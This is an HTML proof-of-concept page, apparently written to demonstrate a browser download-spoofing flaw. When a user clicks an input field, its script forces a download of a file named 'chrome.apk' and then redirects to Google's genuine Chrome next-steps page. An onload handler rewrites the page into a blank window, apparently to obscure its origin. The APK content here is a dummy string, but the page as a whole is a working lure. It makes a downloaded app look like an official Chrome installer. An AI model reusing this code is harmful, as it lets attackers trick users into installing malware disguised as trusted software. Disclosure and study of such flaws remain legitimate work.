
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
  
</head>
<body>
  <center><h2>POC by zzy!</h2></center>
  <input type="text" id="triggerInput">
  <script>
  
    document.getElementById('triggerInput').addEventListener('click', function() {
      openWin();
 setTimeout(function() {
         window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_self');
 }, 1000);
    }, { once: false }); // Use { once: true } to ensure it only fires once
    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.target="_self";
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
    // Kick off your “APK” download
    function openWin() {
      Puf(
        "data:application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=",
        "chrome.apk"
      );
    }

  </script>  

  
</body>
  <script>
     window.onload=function(){
     var x = window.open("","_self");
      x.document.write(document.body.innerHTML);
    }</script>
</html>
